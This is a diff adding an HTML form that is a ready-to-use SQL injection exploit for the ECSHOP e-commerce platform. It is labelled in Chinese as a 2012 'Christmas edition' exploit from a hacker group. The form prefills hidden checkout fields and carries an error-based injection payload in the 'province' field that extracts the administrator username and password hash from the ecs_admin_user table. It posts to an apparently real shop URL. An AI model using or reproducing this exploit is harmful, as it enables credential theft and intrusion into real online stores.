@@ -1,0 +1,14 @@
+<form name="form1" method="post">
+ ECSHOP通版本注入漏洞 2012圣诞版简单EXP [ Silic Group Hacker Army ]<input name="country" type="text" style="display:none" value="1"/><br />
+ <textarea rows="5" style="font-family:Times New Roman;font-size:14pt;" cols="80" name="province">11'and(select 1 from(select count(*),concat(floor(rand(0)*2),0x3a,(select(select(SELECT concat(user_name,0x3a,password)FROM ecs_admin_user limit 0,1))from information_schema.tables limit 0,1))x from information_schema.tables group by x)a) and 1=1#</textarea>
+ <input name="district" type="text" style="display:none" value="1294"/>
+ <input name="consignee" type="text" style="display:none" value="1111111"/>
+ <input name="email" type="text" style="display:none" value="silic@blackbap.com"/>
+ <input name="address" type="text" style="display:none" value="111111"/>
+ <input name="tel" type="text" style="display:none" value="1111111"/>
+ <input name="step" type="text" style="display:none" value="consignee"/>
+ <input name="act" type="text" style="display:none" value="checkout"/><br /><br />
+ 地址：<input name="theAction" type="text" id="theAction" value="http://minijd007.com/flow.php?step=consignee" size="50"><br /><br />
+ <input type="submit" value="配送至这个地址" onClick="this.form.action=this.form.theAction.value;" name="Submit"><br/><br />
+ //BlackBap.Org
+ </form>
